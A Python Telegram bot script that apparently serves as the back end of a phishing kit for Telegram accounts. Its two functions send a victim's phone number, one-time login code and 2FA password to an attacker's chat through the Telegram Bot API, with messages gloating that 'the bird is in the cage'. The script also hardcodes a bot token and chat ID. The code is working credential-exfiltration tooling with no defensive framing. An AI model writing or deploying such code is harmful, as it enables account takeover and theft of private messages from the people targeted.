import telebot
import requests
from datetime import datetime

BOT_TOKEN = '8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk'
CHAT_ID = 640412206
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def starting(message):
    bot.send_message(message.chat.id, 'WHAT`S UUUUP!!😈')

def send_number_to_telegram(session_data: dict):
    text = (
        "📥 Новая сессия\n\n"
        f"📱 Получен номер: +{session_data.get('phone')}\n"
        f"⏰ Время: {datetime.utcnow().isoformat()}"
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": text
    })

def send_session_to_telegram(session_data: dict):
    text = (
        "✅ПТИЧКА В КЛЕТКЕ\n\n"
        f"📱Номер: +{session_data.get('phone')}\n"
        f"🔢 Код: {session_data.get('code')}\n"
        f"🔐 2FA: {session_data.get('password')}\n"
        f"⏰ Время: {session_data.get('verified')}"
    )

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={
        "chat_id": CHAT_ID,
        "text": text
    })
